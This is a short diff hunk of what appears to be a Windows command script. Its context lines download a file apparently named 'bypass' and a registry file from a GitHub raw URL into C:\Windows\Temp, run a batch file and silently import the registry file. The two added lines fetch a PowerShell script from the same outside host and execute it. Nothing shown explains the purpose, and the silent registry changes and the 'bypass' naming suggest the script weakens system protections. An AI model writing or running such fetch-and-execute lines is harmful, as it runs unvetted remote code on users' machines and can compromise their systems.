@@ -6,3 +6,5 @@ powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/bypass
 cmd /c "C:\Windows\Temp\bp.bat"
 powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/final.reg -O C:\Windows\Temp\final.reg"
 regedit /s "C:\Windows\Temp\final.reg"
+powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/script.ps1 -O C:\Windows\Temp\script.ps1"
+powershell.exe -File "C:\Windows\Temp\script.ps1"
